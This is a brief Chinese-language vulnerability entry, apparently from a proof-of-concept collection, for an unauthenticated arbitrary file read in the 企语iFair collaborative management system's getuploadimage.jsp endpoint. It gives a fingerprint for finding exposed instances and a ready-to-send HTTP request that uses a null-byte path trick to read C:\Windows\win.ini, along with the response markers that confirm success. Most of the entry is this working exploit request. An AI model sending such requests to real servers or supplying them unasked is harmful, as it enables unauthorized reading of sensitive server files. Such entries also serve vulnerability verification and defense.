﻿# 企语iFair协同管理系统getuploadimage.jsp任意文件读取漏洞

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：企语iFair协同管理系统getuploadimage.jsp接口处存在任意文件读取漏洞，未经身份认证的攻击者可以通过此漏洞获取服务器敏感信息，使系统处于极不安全状态。

> 漏洞特征：app:"企语 iFair"

> 验证脚本：HTTP

```
GET /oa/common/components/upload/getuploadimage.jsp?imageURL=C:\Windows\win.ini%00.jpg HTTP/1.1
Connection: close
Accept-Encoding: gzip, deflate, br
```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：


> 验证文件来源：企语iFair协同管理系统getuploadimage.jsp任意文件读取漏洞.poc
